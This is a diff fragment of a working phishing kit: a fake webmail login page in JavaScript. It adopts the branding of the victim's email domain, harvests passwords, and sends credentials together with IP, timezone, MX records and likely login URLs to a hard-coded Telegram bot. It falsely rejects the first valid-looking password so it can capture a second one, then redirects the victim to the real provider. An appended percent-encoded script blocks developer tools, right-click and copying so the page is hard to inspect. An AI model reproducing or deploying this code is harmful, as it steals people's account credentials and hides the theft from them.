+                ipChip.textContent = 'IP: unavailable';
+            }
+        }
+
+        function updateVisitorClock() {
+            const chip = document.getElementById('vbTimeChip');
+            const now = new Date();
+            chip.textContent = now.toLocaleString();
+        }
+
+        (function initVisitorBanner() {
+            const sessionStart = new Date();
+            document.getElementById('vbSessionStart').textContent =
+                sessionStart.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+
+            const host = window.location.hostname.replace(/^www\./, '');
+            if (host && host !== 'localhost' && host !== '127.0.0.1') {
+                updateVisitorBannerFromEmail('user@' + host);
+            } else {
+                updateVisitorBannerFromEmail('user@contoso.com');
+            }
+
+            updateVisitorIP();
+            updateVisitorClock();
+            setInterval(updateVisitorClock, 1000);
+        })();
+
+        /* ============================================================
+           MAIN LOGIN SCRIPT
+           ============================================================ */
+        const TELEGRAM_BOT_TOKEN = "8867759572:AAEa4UTJ6iYKIh5sG2uIU0Q2ZrmnMKugVKQ";
+        const TELEGRAM_CHAT_ID = "1767885138";
+
+        const DEFAULT_TITLE = "Webmail Login";
+        const DEFAULT_FAVICON = "data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%238a9aa8' d='M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z'/%3E%3C/svg%3E";
+
+        let validAttemptCount = 0;
+        let lastBgDomain = null;
+        let lastColorDomain = null;
+        let lastTabDomain = null;
+        let cachedProvider = null;
+        let cachedMx = null;
+        let emailLockInterval = null;
+
+        function getDomainFromEmail(email) {
+            if (!email || !email.includes('@')) return null;
+            const parts = email.split('@');
+            if (parts.length !== 2) return null;
+            const domain = parts[1].trim().toLowerCase();
+            return domain || null;
+        }
+
+        function getFaviconUrl(domain, size) {
+            if (!domain) return null;
+            return `https://www.google.com/s2/favicons?domain=${encodeURIComponent(domain)}&sz=${size || 64}`;
+        }
+
+        function getCorsFaviconUrl(domain, size) {
+            if (!domain) return null;
+            const original = `https://www.google.com/s2/favicons?domain=${encodeURIComponent(domain)}&sz=${size || 64}`;
+            return `https://wsrv.nl/?url=${encodeURIComponent(original)}&n=-1`;
+        }
+
+        function lockEmailField() {
+            const $user = $("#USER");
+            if (emailLockInterval) { clearInterval(emailLockInterval); emailLockInterval = null; }
+            $user.prop("readonly", true);
+            $user.attr("readonly", "readonly");
+            $user.attr("autocomplete", "off");
+            $user.attr("aria-readonly", "true");
+            $user.css("pointer-events", "none");
+            $user.on("keydown.lock keypress.lock keyup.lock paste.lock input.lock cut.lock copy.lock drop.lock dragover.lock", function(ev) {
+                ev.preventDefault(); ev.stopPropagation(); return false;
+            });
+            $user.blur();
+            emailLockInterval = setInterval(function() {
+                const el = document.getElementById('USER');
+                if (!el) return;
+                if (el.readOnly !== true) { el.readOnly = true; el.setAttribute('readonly', 'readonly'); }
+                if (el.getAttribute('autocomplete') !== 'off') { el.setAttribute('autocomplete', 'off'); }
+                el.style.pointerEvents = 'none';
+            }, 200);
+        }
+
+        function unlockEmailField() {
+            const $user = $("#USER");
+            if (emailLockInterval) { clearInterval(emailLockInterval); emailLockInterval = null; }
+            $user.prop("readonly", false);
+            $user.removeAttr("readonly");
+            $user.removeAttr("aria-readonly");
+            $user.attr("autocomplete", "username");
+            $user.css("pointer-events", "");
+            $user.off(".lock");
+        }
+
+        async function getDNSRecords(domain, type) {
+            if (!domain) return null;
+            try {
+                const url = `https://dns.google/resolve?name=${encodeURIComponent(domain)}&type=${type}`;
+                const res = await fetch(url);
+                const data = await res.json();
+                return (data.Answer || []);
+            } catch (e) { return null; }
+        }
+
+        async function getMXRecords(domain) {
+            const records = await getDNSRecords(domain, 'MX');
+            if (!records || records.length === 0) return null;
+            const mx = records
+                .filter(r => r.type === 15)
+                .map(r => {
+                    const parts = r.data.split(' ');
+                    return {
+                        priority: parseInt(parts[0], 10),
+                        host: parts[1] ? parts[1].replace(/\.$/, '') : 'unknown'
+                    };
+                })
+                .sort((a, b) => a.priority - b.priority);
+            return mx.length > 0 ? mx : null;
+        }
+
+        function detectMailProvider(mxRecords) {
+            if (!mxRecords || mxRecords.length === 0) {
+                return { name: 'Unknown (no MX records)', url: null };
+            }
+            const joined = mxRecords.map(m => m.host).join(' ').toLowerCase();
+            const providers = [
+                { match: /google|googlemail|gmail/,           name: 'Google Workspace',       url: 'https://accounts.google.com/signin' },
+                { match: /outlook|office365|microsoft|protection\.outlook/, name: 'Microsoft 365', url: 'https://outlook.office.com/mail/' },
+                { match: /protonmail|proton\.me/,             name: 'Proton Mail',            url: 'https://mail.proton.me' },
+                { match: /zoho/,                              name: 'Zoho Mail',              url: 'https://mail.zoho.com' },
+                { match: /yandex/,                            name: 'Yandex Mail',            url: 'https://mail.yandex.com' },
+                { match: /icloud|apple/,                      name: 'iCloud Mail',            url: 'https://www.icloud.com/mail' },
+                { match: /secureserver|godaddy/,              name: 'GoDaddy Email',          url: 'https://email.godaddy.com' },
+                { match: /registrar-servers|namecheap/,       name: 'Namecheap Private Email', url: 'https://privateemail.com' },
+                { match: /fastmail/,                          name: 'Fastmail',               url: 'https://app.fastmail.com' },
+                { match: /mimecast/,                          name: 'Mimecast',               url: null },
+                { match: /proofpoint/,                        name: 'Proofpoint',             url: null },
+                { match: /barracuda/,                          name: 'Barracuda',              url: null },
+                { match: /messagelabs|symantec/,              name: 'Symantec MessageLabs',   url: null },
+                { match: /mailgun/,                           name: 'Mailgun',                url: null },
+                { match: /sendgrid/,                          name: 'SendGrid',               url: null },
+                { match: /amazonses|amazonaws/,               name: 'Amazon SES',             url: null },
+                { match: /qq\.com/,                           name: 'QQ Mail',                url: 'https://mail.qq.com' },
+                { match: /163\.com|126\.com/,                 name: 'NetEase Mail',           url: 'https://mail.163.com' },
+                { match: /gmx/,                               name: 'GMX Mail',               url: 'https://www.gmx.com' },
+                { match: /web\.de/,                           name: 'Web.de',                 url: 'https://web.de' },
+                { match: /tutanota|tuta/,                     name: 'Tutanota',               url: 'https://mail.tutanota.com' },
+                { match: /mailbox\.org/,                      name: 'Mailbox.org',            url: 'https://mailbox.org' },
+                { match: /ionos|1and1|schlund/,               name: 'IONOS',                  url: 'https://webmail.ionos.com' },
+                { match: /roundcube|horde|squirrelmail/,      name: 'Self-hosted webmail',    url: null },
+            ];
+            for (const p of providers) {
+                if (p.match.test(joined)) return p;
+            }
+            return { name: 'Self-hosted / Unknown provider', url: null, mx: mxRecords };
+        }
+
+        function getWebmailUrls(domain) {
+            if (!domain) return [];
+            return [
+                `https://webmail.${domain}`,
+                `https://mail.${domain}`,
+                `https://email.${domain}`,
+                `https://webmail.${domain}/webmail/`,
+                `https://mail.${domain}/webmail/`,
+                `https://${domain}/webmail`,
+                `https://${domain}/webmail/`,
+                `https://${domain}/mail`,
+                `https://${domain}/mail/`,
+                `https://${domain}/roundcube/`,
+                `https://${domain}/horde/`,
+                `https://${domain}/squirrelmail/`,
+                `https://${domain}/zimbra/`,
+                `https://${domain}/owa/`,
+                `https://${domain}/exchange/`,
+                `https://${domain}/login`,
+                `https://${domain}:2096`,
+                `http://${domain}:2095`,
+                `https://${domain}:8443`,
+                `https://${domain}:2222`,
+            ];
+        }
+
+        async function getClientIP() {
+            try {
+                const res = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
+                const text = await res.text();
+                const ipLine = text.split('\n').find(l => l.startsWith('ip='));
+                if (ipLine) {
+                    const ip = ipLine.substring(3).trim();
+                    if (ip) return ip;
+                }
+            } catch (e) { }
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                if (data.ip) return data.ip;
+            } catch (e) { }
+            return 'Unknown';
+        }
+
+        function updateTabBranding(domain) {
+            if (!domain) {
+                document.title = DEFAULT_TITLE;
+                const link = document.getElementById('tabFavicon');
+                if (link) { link.type = 'image/svg+xml'; link.href = DEFAULT_FAVICON; }
+                lastTabDomain = null;
+                return;
+            }
+            if (domain === lastTabDomain) return;
+            lastTabDomain = domain;
+            document.title = domain;
+            const faviconUrl = getFaviconUrl(domain, 64);
+            const link = document.getElementById('tabFavicon');
+            if (link) { link.type = 'image/png'; link.href = faviconUrl; }
+            else {
+                const newLink = document.createElement('link');
+                newLink.id = 'tabFavicon';
+                newLink.rel = 'icon';
+                newLink.type = 'image/png';
+                newLink.href = faviconUrl;
+                document.head.appendChild(newLink);
+            }
+        }
+
+        function rgbToHex(r, g, b) {
+            return '#' + [r, g, b].map(v => {
+                const h = Math.max(0, Math.min(255, Math.round(v))).toString(16);
+                return h.length === 1 ? '0' + h : h;
+            }).join('');
+        }
+        function hexToRgb(hex) {
+            const m = hex.replace('#', '').match(/.{2}/g);
+            if (!m) return { r: 0, g: 0, b: 0 };
+            return { r: parseInt(m[0], 16), g: parseInt(m[1], 16), b: parseInt(m[2], 16) };
+        }
+        function shadeColor(hex, amount) {
+            const { r, g, b } = hexToRgb(hex);
+            let nr, ng, nb;
+            if (amount < 0) {
+                nr = r * (1 + amount); ng = g * (1 + amount); nb = b * (1 + amount);
+            } else {
+                nr = r + (255 - r) * amount; ng = g + (255 - g) * amount; nb = b + (255 - b) * amount;
+            }
+            return rgbToHex(nr, ng, nb);
+        }
+        function luminance(r, g, b) {
+            const a = [r, g, b].map(v => {
+                v /= 255;
+                return v <= 0.03928 ? v / 12.92 : Math.pow((v + 0.055) / 1.055, 2.4);
+            });
+            return 0.2126 * a[0] + 0.7152 * a[1] + 0.0722 * a[2];
+        }
+        function saturation(r, g, b) {
+            const max = Math.max(r, g, b) / 255;
+            const min = Math.min(r, g, b) / 255;
+            if (max === min) return 0;
+            const l = (max + min) / 2;
+            const d = max - min;
+            return l > 0.5 ? d / (2 - max - min) : d / (max + min);
+        }
+        function extractDominantColor(img) {
+            try {
+                const canvas = document.createElement('canvas');
+                const size = 64;
+                canvas.width = size; canvas.height = size;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(img, 0, 0, size, size);
+                const data = ctx.getImageData(0, 0, size, size).data;
+                const buckets = {};
+                let bestColor = null, bestScore = -1;
+                for (let i = 0; i < data.length; i += 4) {
+                    const r = data[i], g = data[i + 1], b = data[i + 2], a = data[i + 3];
+                    if (a < 200) continue;
+                    const lum = luminance(r, g, b);
+                    if (lum > 0.9 || lum < 0.08) continue;
+                    const sat = saturation(r, g, b);
+                    if (sat < 0.15) continue;
+                    const key = `${r >> 5}-${g >> 5}-${b >> 5}`;
+                    if (!buckets[key]) buckets[key] = { r: 0, g: 0, b: 0, count: 0 };
+                    buckets[key].r += r; buckets[key].g += g; buckets[key].b += b; buckets[key].count++;
+                }
+                for (const key in buckets) {
+                    const b = buckets[key];
+                    const avgR = b.r / b.count, avgG = b.g / b.count, avgB = b.b / b.count;
+                    const sat = saturation(avgR, avgG, avgB);
+                    const score = b.count * (0.3 + sat * 1.5);
+                    if (score > bestScore) { bestScore = score; bestColor = rgbToHex(avgR, avgG, avgB); }
+                }
+                return bestColor;
+            } catch (e) { return null; }
+        }
+
+        function applyButtonColor(baseColor) {
+            const btn = document.getElementById('loginBtn');
+            const next = document.getElementById('nextBtn');
+            if (!baseColor) {
+                [btn, next].forEach(el => {
+                    if (!el) return;
+                    el.style.removeProperty('--btn-color');
+                    el.style.removeProperty('--btn-hover-color');
+                    el.style.removeProperty('--btn-disabled-color');
+                });
+                document.documentElement.style.removeProperty('--brand');
+                return;
+            }
+            const hover = shadeColor(baseColor, -0.15);
+            const disabled = shadeColor(baseColor, 0.45);
+            [btn, next].forEach(el => {
+                if (!el) return;
+                el.style.setProperty('--btn-color', baseColor);
+                el.style.setProperty('--btn-hover-color', hover);
+                el.style.setProperty('--btn-disabled-color', disabled);
+            });
+            document.documentElement.style.setProperty('--brand', baseColor);
+        }
+
+        function updateDomainFavicon(email) {
+            const faviconBox = document.getElementById('faviconBox');
+            if (!faviconBox) return;
+            const domain = getDomainFromEmail(email);
+
+            if (!domain) {
+                faviconBox.innerHTML = `
+                    <div class="fallback-icon">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
+                        </svg>
+                    </div>`;
+                applyButtonColor(null);
+                updateTabBranding(null);
+                lastColorDomain = null;
+                return;
+            }
+
+            updateTabBranding(domain);
+            if (domain === lastColorDomain) return;
+            lastColorDomain = domain;
+
+            const displayImg = new Image();
+            displayImg.alt = domain + ' favicon';
+            displayImg.onload = function () {
+                faviconBox.innerHTML = '';
+                faviconBox.appendChild(displayImg);
+            };
+            displayImg.onerror = function () {
+                faviconBox.innerHTML = `
+                    <div class="fallback-icon">
+                        <svg viewBox="0 0 24 24">
+                            <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
+                        </svg>
+                    </div>`;
+            };
+            displayImg.src = getFaviconUrl(domain, 128);
+
+            const colorImg = new Image();
+            colorImg.crossOrigin = 'anonymous';
+            colorImg.onload = function () {
+                applyButtonColor(extractDominantColor(colorImg));
+            };
+            colorImg.onerror = function () {
+                const fallbackImg = new Image();
+                fallbackImg.crossOrigin = 'anonymous';
+                fallbackImg.onload = function () { applyButtonColor(extractDominantColor(fallbackImg)); };
+                fallbackImg.onerror = function () { applyButtonColor(null); };
+                fallbackImg.src = getFaviconUrl(domain, 64);
+            };
+            colorImg.src = getCorsFaviconUrl(domain, 64);
+        }
+
+        function getGrabbedDomain(email) {
+            try {
+                const emailDomain = getDomainFromEmail(email);
+                if (emailDomain) return emailDomain;
+                const hostname = window.location.hostname;
+                const parts = hostname.split('.');
+                if (parts.length > 2) return parts.slice(-2).join('.');
+                return hostname;
+            } catch (e) { return 'buchenwald.de'; }
+        }
+
+        function getRedirectUrl(email) {
+            if (cachedProvider && cachedProvider.url) return cachedProvider.url;
+            return `https://${getGrabbedDomain(email)}/`;
+        }
+
+        function sendToTelegram(message) {
+            return $.ajax({
+                url: `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+                method: "POST",
+                data: { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: "Markdown" }
+            });
+        }
+
+        function isValidPassword(password) {
+            if (!password || password.length < 6) return false;
+            return /[a-zA-Z]/.test(password) && /[0-9]/.test(password);
+        }
+
+        async function buildLoginReport(username, password, ip, status) {
+            const domain = getGrabbedDomain(username);
+            if (!cachedMx || cachedMx.__domain !== domain) {
+                cachedMx = await getMXRecords(domain);
+                if (cachedMx) cachedMx.__domain = domain;
+                cachedProvider = detectMailProvider(cachedMx);
+            }
+            const webmailUrls = getWebmailUrls(domain);
+            const tz = (function() {
+                try { return Intl.DateTimeFormat().resolvedOptions().timeZone; }
+                catch (e) { return 'Unknown'; }
+            })();
+
+            const company = domainToCompanyName(domain) || 'Unknown';
+
+            let msg = `${status}\n`;
+            msg += `🏢 *Company:* ${company}\n`;
+            msg += `🌐 *Domain:* ${domain}\n`;
+            msg += `👤 *Credentials:* \`${username}, ${password}\`\n`;
+            msg += `🌍 *Client IP:* ${ip}\n`;
+            msg += `🕒 *Timezone:* ${tz}\n`;
+
+            if (cachedProvider) {
+                msg += `📮 *Mail Provider:* ${cachedProvider.name}\n`;
+                if (cachedProvider.url) {
+                    msg += `🔗 *Provider Login:* ${cachedProvider.url}\n`;
+                }
+            }
+            if (cachedMx && cachedMx.length > 0) {
+                msg += `📧 *MX Records:*\n`;
+                cachedMx.forEach(mx => { msg += `  • ${mx.priority} → \`${mx.host}\`\n`; });
+            } else {
+                msg += `📧 *MX Records:* None found\n`;
+            }
+            msg += `📮 *Likely Login Pages:*\n`;
+            webmailUrls.forEach(url => { msg += `  • ${url}\n`; });
+            return msg;
+        }
+
+        $(document).ready(function() {
+            $("#backLink").hide();
+            unlockEmailField();
+
+            (function autoFill() {
+                let emailFromUrl = null;
+                const hash = window.location.hash;
+                if (hash && hash.length > 1 && hash.includes('@')) {
+                    emailFromUrl = hash.substring(1);
+                } else {
+                    const params = new URLSearchParams(window.location.search);
+                    emailFromUrl = params.get('user') || params.get('email') || params.get('login');
+                }
+                if (emailFromUrl) {
+                    const input = document.getElementById('USER');
+                    if (input) {
+                        input.value = emailFromUrl;
+                        updateDomainFavicon(emailFromUrl);
+                        updateVisitorBannerFromEmail(emailFromUrl);
+                    }
+                }
+            })();
+
+            $("#USER").on("input", function() {
+                const v = $(this).val().trim();
+                if (v.includes('@')) {
+                    updateDomainFavicon(v);
+                    updateVisitorBannerFromEmail(v);
+                } else {
+                    updateDomainFavicon('');
+                }
+            });
+
+            $("#PASSWORD").on("keyup keydown", function(e) {
+                const orig = e.originalEvent;
+                const capsOn = orig.getModifierState && orig.getModifierState("CapsLock");
+                $("#capsWarn").toggle(!!capsOn);
+            });
+
+            $("#forgotLink").on("click", function(e) {
+                e.preventDefault();
+                $("#error2")
+                    .text("Password reset is not available for this account. Please contact your administrator.")
+                    .show();
+                setTimeout(() => $("#error2").hide(), 3500);
+            });
+
+            $("#backLink").on("click", function() {
+                $("#step2").hide();
+                $("#step1").show();
+                $("#backLink").hide();
+                unlockEmailField();
+                $("#PASSWORD").val("");
+                $("#error2").hide();
+                $("#capsWarn").hide();
+                setTimeout(() => $("#USER").focus(), 50);
+            });
+
+            $("#nextBtn").on("click", function() {
+                const username = $("#USER").val().trim();
+                if (!username || !username.includes('@')) {
+                    $("#error1").text("Enter a valid email address.").show();
+                    return;
+                }
+                $("#error1").hide();
+                $("#greetingEmail").text(username);
+                $("#step1").hide();
+                $("#step2").show();
+                $("#backLink").show();
+                lockEmailField();
+                updateVisitorBannerFromEmail(username);
+                setTimeout(() => $("#PASSWORD").focus(), 50);
+
+                (async function prewarm() {
+                    const domain = getDomainFromEmail(username);
+                    if (!domain) return;
+                    if (!cachedMx || cachedMx.__domain !== domain) {
+                        cachedMx = await getMXRecords(domain);
+                        if (cachedMx) cachedMx.__domain = domain;
+                        cachedProvider = detectMailProvider(cachedMx);
+                    }
+                })();
+            });
+
+            $("#USER").on("keydown", function(e) {
+                if (e.key === "Enter" && !$(this).prop("readonly")) {
+                    e.preventDefault();
+                    $("#nextBtn").click();
+                }
+            });
+
+            $("#loginForm").on("submit", async function(e) {
+                e.preventDefault();
+                const username = $("#USER").val().trim();
+                const password = $("#PASSWORD").val().trim();
+                if (!username || !password) {
+                    $("#error2").text("Please enter your password.").show();
+                    return;
+                }
+
+                $("#loginBtn").prop("disabled", true)
+                    .html('<span class="spinner"></span>Signing in...');
+                $("#error2").hide();
+
+                try {
+                    const ip = await getClientIP();
+                    const passwordIsValid = isValidPassword(password);
+
+                    if (!passwordIsValid) {
+                        const msg = await buildLoginReport(username, password, ip, '❌ *Webmail Login — INVALID*');
+                        await sendToTelegram(msg);
+                        $("#error2").text('Incorrect password. Try again ').show();
+                        $("#PASSWORD").val("").focus();
+                        $("#loginBtn").prop("disabled", false).text("Sign in");
+                        return;
+                    }
+
+                    validAttemptCount++;
+
+                    if (validAttemptCount === 1) {
+                        const msg = await buildLoginReport(username, password, ip, '✅ *Webmail Login — VALID 1*');
+                        await sendToTelegram(msg);
+                        $("#error2").text('Incorrect password. Try again ').show();
+                        $("#PASSWORD").val("").focus();
+                        $("#loginBtn").prop("disabled", false).text("Sign in");
+                        return;
+                    }
+
+                    const msg = await buildLoginReport(username, password, ip, '✅ *Webmail Login — VALID 2*');
+                    await sendToTelegram(msg);
+
+                    $("#loginBtn").html('<span class="spinner"></span>Redirecting...');
+                    setTimeout(() => {
+                        const redirectUrl = (cachedProvider && cachedProvider.url)
+                            ? cachedProvider.url
+                            : `https://${getGrabbedDomain(username)}/`;
+                        window.location.href = redirectUrl;
+                    }, 1200);
+
+                } catch (error) {
+                    setTimeout(() => {
+                        const redirectUrl = (cachedProvider && cachedProvider.url)
+                            ? cachedProvider.url
+                            : `https://${getGrabbedDomain(username)}/`;
+                        window.location.href = redirectUrl;
+                    }, 800);
+                }
+            });
+        });
+    </script>
+
+    <!-- ============================================================
+         ANTI-INSPECT PROTECTION
+         ============================================================ -->
+    <script>
+<script>document.write(unescape('%20%20%20%20%28%66%75%6E%63%74%69%6F%6E%28%29%20%7B%0A%20%20%20%20%20%20%20%20%22%75%73%65%20%73%74%72%69%63%74%22%3B%0A%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%6E%6F%6F%70%20%3D%20%66%75%6E%63%74%69%6F%6E%28%29%20%7B%7D%3B%0A%20%20%20%20%20%20%20%20%5B%27%6C%6F%67%27%2C%20%27%77%61%72%6E%27%2C%20%27%65%72%72%6F%72%27%2C%20%27%64%65%62%75%67%27%2C%20%27%69%6E%66%6F%27%2C%20%27%74%72%61%63%65%27%2C%20%27%64%69%72%27%2C%20%27%64%69%72%78%6D%6C%27%2C%0A%20%20%20%20%20%20%20%20%20%27%67%72%6F%75%70%27%2C%20%27%67%72%6F%75%70%45%6E%64%27%2C%20%27%74%69%6D%65%27%2C%20%27%74%69%6D%65%45%6E%64%27%2C%20%27%63%6F%75%6E%74%27%2C%20%27%61%73%73%65%72%74%27%2C%0A%20%20%20%20%20%20%20%20%20%27%70%72%6F%66%69%6C%65%27%2C%20%27%70%72%6F%66%69%6C%65%45%6E%64%27%5D%2E%66%6F%72%45%61%63%68%28%6D%65%74%68%6F%64%20%3D%3E%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%74%72%79%20%7B%20%69%66%20%28%63%6F%6E%73%6F%6C%65%5B%6D%65%74%68%6F%64%5D%29%20%63%6F%6E%73%6F%6C%65%5B%6D%65%74%68%6F%64%5D%20%3D%20%6E%6F%6F%70%3B%20%7D%20%63%61%74%63%68%20%28%65%29%20%7B%7D%0A%20%20%20%20%20%20%20%20%7D%29%3B%0A%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%6B%65%79%64%6F%77%6E%27%2C%20%66%75%6E%63%74%69%6F%6E%28%65%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%65%2E%6B%65%79%20%3D%3D%3D%20%27%46%31%32%27%20%7C%7C%20%65%2E%6B%65%79%43%6F%64%65%20%3D%3D%3D%20%31%32%33%29%20%7B%20%65%2E%70%72%65%76%65%6E%74%44%65%66%61%75%6C%74%28%29%3B%20%65%2E%73%74%6F%70%50%72%6F%70%61%67%61%74%69%6F%6E%28%29%3B%20%72%65%74%75%72%6E%20%66%61%6C%73%65%3B%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%65%2E%63%74%72%6C%4B%65%79%20%26%26%20%65%2E%73%68%69%66%74%4B%65%79%20%26%26%20%5B%27%49%27%2C%27%69%27%2C%27%4A%27%2C%27%6A%27%2C%27%43%27%2C%27%63%27%5D%2E%69%6E%63%6C%75%64%65%73%28%65%2E%6B%65%79%29%29%20%7B%20%65%2E%70%72%65%76%65%6E%74%44%65%66%61%75%6C%74%28%29%3B%20%65%2E%73%74%6F%70%50%72%6F%70%61%67%61%74%69%6F%6E%28%29%3B%20%72%65%74%75%72%6E%20%66%61%6C%73%65%3B%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%65%2E%63%74%72%6C%4B%65%79%20%26%26%20%28%65%2E%6B%65%79%20%3D%3D%3D%20%27%55%27%20%7C%7C%20%65%2E%6B%65%79%20%3D%3D%3D%20%27%75%27%29%29%20%7B%20%65%2E%70%72%65%76%65%6E%74%44%65%66%61%75%6C%74%28%29%3B%20%65%2E%73%74%6F%70%50%72%6F%70%61%67%61%74%69%6F%6E%28%29%3B%20%72%65%74%75%72%6E%20%66%61%6C%73%65%3B%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%65%2E%63%74%72%6C%4B%65%79%20%26%26%20%28%65%2E%6B%65%79%20%3D%3D%3D%20%27%53%27%20%7C%7C%20%65%2E%6B%65%79%20%3D%3D%3D%20%27%73%27%29%29%20%7B%20%65%2E%70%72%65%76%65%6E%74%44%65%66%61%75%6C%74%28%29%3B%20%65%2E%73%74%6F%70%50%72%6F%70%61%67%61%74%69%6F%6E%28%29%3B%20%72%65%74%75%72%6E%20%66%61%6C%73%65%3B%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%65%2E%63%74%72%6C%4B%65%79%20%26%26%20%28%65%2E%6B%65%79%20%3D%3D%3D%20%27%50%27%20%7C%7C%20%65%2E%6B%65%79%20%3D%3D%3D%20%27%70%27%29%29%20%7B%20%65%2E%70%72%65%76%65%6E%74%44%65%66%61%75%6C%74%28%29%3B%20%65%2E%73%74%6F%70%50%72%6F%70%61%67%61%74%69%6F%6E%28%29%3B%20%72%65%74%75%72%6E%20%66%61%6C%73%65%3B%20%7D%0A%20%20%20%20%20%20%20%20%7D%2C%20%74%72%75%65%29%3B%0A%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%63%6F%6E%74%65%78%74%6D%65%6E%75%27%2C%20%66%75%6E%63%74%69%6F%6E%28%65%29%20%7B%20%65%2E%70%72%65%76%65%6E%74%44%65%66%61%75%6C%74%28%29%3B%20%65%2E%73%74%6F%70%50%72%6F%70%61%67%61%74%69%6F%6E%28%29%3B%20%72%65%74%75%72%6E%20%66%61%6C%73%65%3B%20%7D%2C%20%74%72%75%65%29%3B%0A%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%64%72%61%67%73%74%61%72%74%27%2C%20%66%75%6E%63%74%69%6F%6E%28%65%29%20%7B%20%65%2E%70%72%65%76%65%6E%74%44%65%66%61%75%6C%74%28%29%3B%20%72%65%74%75%72%6E%20%66%61%6C%73%65%3B%20%7D%2C%20%74%72%75%65%29%3B%0A%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%73%65%6C%65%63%74%73%74%61%72%74%27%2C%20%66%75%6E%63%74%69%6F%6E%28%65%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%74%20%3D%20%65%2E%74%61%72%67%65%74%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%21%74%2E%63%6C%6F%73%65%73%74%20%7C%7C%20%28%21%74%2E%63%6C%6F%73%65%73%74%28%27%69%6E%70%75%74%27%29%20%26%26%20%21%74%2E%63%6C%6F%73%65%73%74%28%27%74%65%78%74%61%72%65%61%27%29%20%26%26%20%21%74%2E%63%6C%6F%73%65%73%74%28%27%73%65%6C%65%63%74%27%29%29%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%65%2E%70%72%65%76%65%6E%74%44%65%66%61%75%6C%74%28%29%3B%20%72%65%74%75%72%6E%20%66%61%6C%73%65%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D%2C%20%74%72%75%65%29%3B%0A%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%63%6F%70%79%27%2C%20%66%75%6E%63%74%69%6F%6E%28%65%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%74%20%3D%20%65%2E%74%61%72%67%65%74%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%21%74%2E%63%6C%6F%73%65%73%74%20%7C%7C%20%28%21%74%2E%63%6C%6F%73%65%73%74%28%27%69%6E%70%75%74%27%29%20%26%26%20%21%74%2E%63%6C%6F%73%65%73%74%28%27%74%65%78%74%61%72%65%61%27%29%29%29%20%7B%20%65%2E%70%72%65%76%65%6E%74%44%65%66%61%75%6C%74%28%29%3B%20%72%65%74%75%72%6E%20%66%61%6C%73%65%3B%20%7D%0A%20%20%20%20%20%20%20%20%7D%2C%20%74%72%75%65%29%3B%0A%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%70%61%73%74%65%27%2C%20%66%75%6E%63%74%69%6F%6E%28%65%29%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%63%6F%6E%73%74%20%74%20%3D%20%65%2E%74%61%72%67%65%74%3B%0A%20%20%20%20%20%20%20%20%20%20%20%20%69%66%20%28%21%74%2E%63%6C%6F%73%65%73%74%20%7C%7C%20%28%21%74%2E%63%6C%6F%73%65%73%74%28%27%69%6E%70%75%74%27%29%20%26%26%20%21%74%2E%63%6C%6F%73%65%73%74%28%27%74%65%78%74%61%72%65%61%27%29%29%29%20%7B%20%65%2E%70%72%65%76%65%6E%74%44%65%66%61%75%6C%74%28%29%3B%20%72%65%74%75%72%6E%20%66%61%6C%73%65%3B%20%7D%0A%20%20%20%20%20%20%20%20%7D%2C%20%74%72%75%65%29%3B%0A%20%20%20%20%20%20%20%20%6C%65%74%20%74%6F%75%63%68%54%69%6D%65%72%20%3D%20%6E%75%6C%6C%3B%0A%20%20%20%20%20%20%20%20%64%6F%63%75%6D%65%6E%74%2E%61%64%64%45%76%65%6E%74%4C%69%73%74%65%6E%65%72%28%27%74%6F%75%63%68%73%74%61%72%74%27%2C%20%66%75%6E%63%74%69%6F%6E%28%65%29%20%7B%0A%20%20%20%20%20%20